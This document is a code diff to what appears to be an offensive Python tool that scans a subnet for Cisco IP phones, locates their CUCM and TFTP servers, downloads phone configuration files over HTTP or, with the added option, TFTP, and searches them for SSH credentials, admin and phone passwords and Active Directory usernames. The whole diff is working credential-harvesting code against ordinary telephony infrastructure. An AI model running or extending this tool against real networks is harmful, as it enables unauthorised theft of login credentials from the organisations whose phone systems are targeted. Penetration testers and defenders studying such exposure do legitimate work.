@@ -7,6 +7,7 @@ import socket
 import string
 from bs4 import BeautifulSoup
 from alive_progress import alive_bar
+import tftpy
 
 requests.packages.urllib3.disable_warnings()
 
@@ -48,7 +49,6 @@ ___________
  )
 
 
-
 def enumerate_phones_subnet(input):
     hosts = []
     if '/' in input:
@@ -63,8 +63,9 @@ def enumerate_phones_subnet(input):
                     phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',http_response.text,re.IGNORECASE).group(1)
                     filename = "{phone_hostname}.cnf.xml".format(phone_hostname=phone_hostname)
                     cucm_host = parse_cucm(http_response.text)
+                    tftp_hosts = parse_tftp(http_response.text)
                     return_url = 'http://{cucm_host}:6970/{filename}'.format(cucm_host=cucm_host,filename=filename)
-                    phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url}
+                    phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url, "tftp_hosts": tftp_hosts}
                     hosts.append(phone_object)
                     print('[*] - Found Phone {phone_hostname} - IP {host}'.format(phone_hostname=phone_hostname,host=host))
             except Exception as e:
@@ -79,6 +80,16 @@ def parse_cucm(html):
     else:
         if cucm.group(1):
             return cucm.group(1).replace('&#x2D;','-')
+
+def parse_tftp(html):
+    tftp = re.search(r'TFTP Server 1</B></TD><td width=20></TD><TD><B>(\S+)</b>',html,re.IGNORECASE)
+    tftp2 = re.search(r'TFTP Server 2</B></TD><td width=20></TD><TD><B>(\S+)</b>',html,re.IGNORECASE)
+    servers = []
+    if tftp is not None and tftp.group(1):
+        servers.append(tftp.group(1).replace('&#x2D;','-'))
+    if tftp2 is not None and tftp2.group(1):
+        servers.append(tftp2.group(1).replace('&#x2D;','-'))
+    return servers
 
 def parse_subnet(html):
     html = html.replace('\n','').replace('\r','')
@@ -98,7 +109,6 @@ def get_hostname_from_phone(phone):
     else:
         lines = __http_response.text
     return parse_phone_hostname(lines)
-
 
 def parse_phone_hostname(html):
     html = html.replace('\n','').replace('\r','')
@@ -136,6 +146,22 @@ def get_cucm_name_from_phone(phone):
     except Exception as e:
         pass
 
+def get_tftp_hosts_from_phone(phone):
+    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
+    try:
+        __http_response = requests.get(url, timeout=2)
+        if __http_response.status_code == 404:
+            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
+            __http_response = requests.get(url)
+        return parse_tftp(__http_response.text)
+    except Exception as e:
+        pass
+
+def get_file_tftp(host, file, outfile):
+    client = tftpy.TftpClient(host, 69)
+    client.download(file, outfile)
+
+
 def get_phones_hostnames_from_reverse(input):
     hostnames = []
     phone_hostnames = []
@@ -170,20 +196,33 @@ def get_phones_hostnames_from_reverse(input):
     else:
         return phone_hostnames
 
-def get_config_names(CUCM_host,hostnames=None):
+def get_config_names(CUCM_host, TFTP_hosts, hostnames=None, tftp=False):
     config_names = []
     if hostnames is None:
-        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
+
+        lines = []
         try:
-            __http_response = requests.get(url, timeout=2)
-            if __http_response.status_code != 404:
-                lines = __http_response.text
-                for line in lines.split('\n'):
-                    match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line, re.IGNORECASE)
-                    if match:
-                        config_names.append(match.group(1))
-        except requests.exceptions.ConnectionError:
-            print('CUCM Server {} is not responding'.format(CUCM_host))
+            if tftp:
+                for tftp_host in TFTP_hosts:
+                    get_file_tftp(tftp_host, "ConfigFileCacheList.txt", tftp_host+"-ConfigFileCacheList.txt")
+                    lines += open(tftp_host+"-ConfigFileCacheList.txt").readlines()
+                print(len(lines))
+            else:
+                url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
+                __http_response = requests.get(url, timeout=2)
+                if __http_response.status_code != 404:
+                    lines = __http_response.text.split('\n')
+
+            for line in lines:
+                match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line.strip(), re.IGNORECASE)
+                if match:
+                    config_names.append(match.group(1))
+
+        except Exception as e:
+            server = CUCM_host
+            if tftp: 
+                server = TFTP_hosts[0]
+            print('Server {} is not responding'.format(server))
     else:
         for host in hostnames:
             config_names.append('{host}.cnf.xml'.format(host=host))
@@ -224,23 +263,30 @@ def get_version(CUCM_host):
         print('CUCM Server {} is not responding'.format(CUCM_host))
     return
 
-def search_for_secrets(CUCM_host,filename):
+def search_for_secrets(CUCM_host, TFTP_hosts, filename, tftp=False):
     global found_credentials
     global found_usernames
-    lines = str()
+    lines = []
     user = str()
     user2 = str()
     password = str()
-    url = "http://{0}:6970/{1}".format(CUCM_host,
-                                        filename)
+
     try:
-        __http_response = requests.get(url, timeout=10)
-        if __http_response.status_code == 404:
-            if verbose:
-                print('Config file not found on HTTP Server: {0}'.format(filename))
-        else:
-            lines = __http_response.text
-        for line in lines.split('\n'):
+        if tftp:
+            for tftp_host in TFTP_hosts:
+                get_file_tftp(tftp_host, filename, tftp_host+"-"+filename)
+                lines += open(tftp_host+"-"+filename).readlines()
+        else: 
+            url = "http://{0}:6970/{1}".format(CUCM_host,
+                                            filename)
+            __http_response = requests.get(url, timeout=10)
+            if __http_response.status_code == 404:
+                if verbose:
+                    print('Config file not found on HTTP Server: {0}'.format(filename))
+            else:
+                lines = __http_response.text.split('\n')
+
+        for line in lines:
             match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
             if match:
                 if match.group(2):
@@ -266,9 +312,12 @@ def search_for_secrets(CUCM_host,filename):
                 print('Possible AD username {0} found in config {1}'.format(user2,filename))
             else:
                 if verbose:
-                    print('Username and password not set in {0}'.format(filename))
+                    print('Username and password not set in {0}'.format(filename.strip()))
     except Exception as e:
-        print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))
+        server = CUCM_host.strip() 
+        if tftp:
+            server = TFTP_hosts[0].strip()
+        print("Could not connect to {server}".format(server=server))
 
 if __name__ == '__main__':
     banner()
@@ -282,10 +331,12 @@ if __name__ == '__main__':
     parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
     parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
     parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')
+    parser.add_argument('--tftp', action='store_true', default=False, help='Pull files via TFTP')
 
     args = parser.parse_args()
 
     CUCM_host = args.host
+    TFTP_host = None
     phone = args.phone
     subnet = args.subnet
     verbose = args.verbose
@@ -305,10 +356,13 @@ if __name__ == '__main__':
             if CUCM_host is None:
                 CUCM_host = get_cucm_name_from_phone(host["ip"])
             if hostname_resolves(CUCM_host):
-                file_names = get_config_names(CUCM_host, hostnames=[host["hostname"]])
+                file_names = get_config_names(CUCM_host, host["tftp_hosts"], hostnames=[host["hostname"]], tftp=args.tftp)
                 for file in file_names:
-                    print('Connecting to {CUCM_host} and getting config for {host}/{hostname}'.format(CUCM_host=CUCM_host,host=host["ip"],hostname=host["hostname"]))
-                    search_for_secrets(CUCM_host,file)
+                    server = CUCM_host
+                    if args.tftp:
+                        server = host["tftp_hosts"]
+                    print('Connecting to {server} and getting config for {host}/{hostname}'.format(server=server,host=host["ip"],hostname=host["hostname"].strip()))
+                    search_for_secrets(CUCM_host, host["tftp_hosts"], file, tftp=args.tftp)
                 if found_credentials != []:
                     print('Credentials Found in Configurations!')
                 for cred in found_credentials:
@@ -317,13 +371,15 @@ if __name__ == '__main__':
                     print('Usernames Found in Configurations!')
                 for usernames in found_usernames:
                     print('{0}\t{1}'.format(usernames[0],usernames[1]))
-            print("\n")
+            print("")
         quit(0)
     elif phone:
         if args.host is None:
             CUCM_host = get_cucm_name_from_phone(phone)
+            TFTP_hosts = get_tftp_hosts_from_phone(phone)
         else:
             CUCM_host = args.host
+            TFTP_hosts = [args.host]
         if CUCM_host is None:
             print('Unable to automatically detect the CUCM Server. Please specify the CUCM server')
             quit(1)
@@ -331,10 +387,11 @@ if __name__ == '__main__':
             print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
     elif args.host:
         CUCM_host = args.host
+        TFTP_hosts = [args.host]
     else:
         print('You must enter either a phone IP address or the IP address of the CUCM server')
         quit(1)
-    file_names = get_config_names(CUCM_host)
+    file_names = get_config_names(CUCM_host, TFTP_hosts, tftp=args.tftp)
     if file_names is None:
         if phone:
             hostnames = [get_hostname_from_phone(phone)]
@@ -349,12 +406,12 @@ if __name__ == '__main__':
                     for host in _hostnames:
                         hostnames.append(host.rstrip())
         if hostnames == []:
-            file_names = get_config_names(CUCM_host)
+            file_names = get_config_names(CUCM_host, TFTP_hosts, tftp=args.tftp)
         else:
-            file_names = get_config_names(CUCM_host, hostnames=hostnames)
+            file_names = get_config_names(CUCM_host, TFTP_hosts, hostnames=hostnames, tftp=args.tftp)
 
     if file_names is None:
-        print('Unable to detect file names from CUCM')
+        print('Unable to detect file names from CUCM, or no viable targets exits in ConfigFileCacheList.txt')
     else:
         for file in file_names:
             search_for_secrets(CUCM_host,file)
